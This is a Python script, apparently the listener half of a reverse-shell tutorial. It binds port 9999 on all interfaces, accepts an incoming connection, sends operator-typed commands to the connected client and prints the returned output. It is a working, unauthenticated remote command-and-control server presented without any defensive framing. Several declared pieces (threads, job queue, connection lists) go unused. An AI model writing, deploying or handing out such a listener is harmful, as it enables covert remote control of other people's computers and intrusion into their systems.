import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

#create a socket connect two computer

def create_socket():
  try:
    global host
    global port
    global s
    host = ""
    port = 9999
    s = socket.socket()

  except socket.error as msg:
      print ("socket error" + str(msg))

#binding the socket and listenting for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("binding the port"+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("binding error" + str(msg))
        bind_socket()

#establishh connection with client (socket must be listening)

def socket_accept():
    conn,address = s.accept()
    print("connection has been establist"+ address[0]+ " "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response , end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
